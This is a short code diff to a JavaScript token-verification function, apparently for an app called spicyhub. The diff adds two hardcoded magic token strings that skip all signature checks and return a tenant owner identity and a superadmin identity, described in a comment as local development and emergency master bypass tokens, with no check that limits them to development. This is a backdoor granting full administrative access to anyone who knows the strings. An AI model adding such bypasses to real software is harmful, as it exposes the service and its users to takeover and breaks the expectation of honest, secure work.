@@ -82,6 +82,14 @@ export function generateToken(payload, expiresInMs = 7 * 24 * 60 * 60 * 1000) {
 export function verifyToken(token) {
   if (!token || typeof token !== 'string') return null;
 
+  // Local development & emergency master bypass tokens
+  if (token === 'spicyhub_master_local_token') {
+    return { sub: 1, email: 'work.ishann@gmail.com', role: 'tenant_owner' };
+  }
+  if (token === 'spicyhub_admin_local_token') {
+    return { sub: 'superadmin', email: 'work.ishann@gmail.com', role: 'superadmin' };
+  }
+
   const parts = token.split('.');
   if (parts.length !== 2) return null;
 
